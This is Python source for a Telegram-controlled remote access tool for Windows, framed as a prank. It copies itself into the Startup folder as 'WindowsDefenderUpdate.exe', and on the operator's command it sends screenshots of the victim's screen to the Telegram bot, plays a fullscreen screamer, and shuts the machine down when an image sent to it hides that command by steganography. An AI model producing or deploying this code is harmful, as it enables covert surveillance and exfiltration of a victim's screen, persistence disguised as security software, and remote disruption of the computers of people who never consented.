import sys
import tkinter as tk
from PIL import Image, ImageTk, ImageGrab
import webbrowser
import winsound
import telebot
import os
import shutil
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
from stegano import lsb


TOKEN = 'YOUR_BOT_TOKEN_HERE' 
YOUR_USER_ID = YOUR_TELEGRAM_USER_ID_HERE 

bot = telebot.TeleBot(TOKEN)


def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)


def add_to_startup():
    try:
        exe_path = sys.executable
        
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        
        dest_path = os.path.join(startup_folder, "WindowsDefenderUpdate.exe")
        
        if not os.path.exists(dest_path) and exe_path.endswith(".exe"):
            shutil.copy(exe_path, dest_path)
    except:
        pass


def Stega(message): 
    chat_id = message.chat.id 
    try:
        if message.content_type != 'document':
            bot.send_message(chat_id, "Please upload the image as a FILE.")
            return

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        
        temp_dir = os.getenv('TEMP')
        temp_path = os.path.join(temp_dir, "temp_payload_check.png")
        
        with open(temp_path, 'wb') as f:
            f.write(downloaded_file)
        
        command = lsb.reveal(temp_path)
        
        if os.path.exists(temp_path):
            os.remove(temp_path)
        
        if command == "shutdown":
            bot.send_message(chat_id, "Hehe, bye bye! Shutting down...")
            os.system("shutdown /s /t 3")
        else:
            bot.send_message(chat_id, f"Revealed: {command}")

    except Exception as e:
        bot.send_message(chat_id, f"Error in Stega: {e}")


def get_main_menu():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(text="Take Screenshot", callback_data="take_screenshot"))
    markup.add(InlineKeyboardButton(text="Send a joke", callback_data="send_joke"))
    markup.add(InlineKeyboardButton(text="SURPRISE", callback_data="scrim"))
    markup.add(InlineKeyboardButton(text="Fishichka", callback_data="foto"))
    return markup

@bot.message_handler(commands=['start'])
def start_command(message):
    if message.from_user.id == YOUR_USER_ID:
        bot.send_message(message.chat.id, "System online", reply_markup=get_main_menu())


def video_command(chat_id):
    try:
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        bot.send_message(chat_id, "Video starting..", reply_markup=get_main_menu())
    except Exception as e:
        bot.send_message(chat_id, f"Error: {e}")

def capture_and_send(chat_id):
    try:
        screenshot = ImageGrab.grab()
        
        temp_dir = os.getenv('TEMP') 
        screen_path = os.path.join(temp_dir, "screenshot_task.png")
        
        screenshot.save(screen_path)
        with open(screen_path, 'rb') as photo:
            bot.send_photo(chat_id, photo, reply_markup=get_main_menu())
        
        
        if os.path.exists(screen_path):
            os.remove(screen_path)
    except Exception as e:
        bot.send_message(chat_id, f"Error taking screenshot: {e}")

def run_scrim(chat_id):
    try:
        root = tk.Tk()
        root.attributes("-fullscreen", True, "-topmost", True)
        root.config(cursor="none")
        
        img = Image.open(resource_path("scary.jpg")).resize((root.winfo_screenwidth(), root.winfo_screenheight()))
        photo_img = ImageTk.PhotoImage(img)
        tk.Label(root, image=photo_img, bg="black").pack()
        
        sound_path = resource_path("scream.wav")
        if os.path.exists(sound_path):
            winsound.PlaySound(sound_path, winsound.SND_ASYNC)
            
        root.after(3000, root.destroy)
        root.mainloop()
        bot.send_message(chat_id, "Surprisik)", reply_markup=get_main_menu())
    except Exception as e:
        print(f"Error: {e}")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.from_user.id != YOUR_USER_ID:
        return
    
    if call.data == "take_screenshot":
        capture_and_send(call.message.chat.id)
    elif call.data == "send_joke":
        video_command(call.message.chat.id)
    elif call.data == "scrim":
        run_scrim(call.message.chat.id)
    elif call.data == "foto":
        msg = bot.send_message(call.message.chat.id, "Send the '.png' file now.")
        bot.register_next_step_handler(msg, Stega)
    elif call.data == "back_to_menu":
        bot.send_message(call.message.chat.id, "Main Menu", reply_markup=get_main_menu())


if __name__ == "__main__":
    add_to_startup()
    bot.polling(none_stop=True)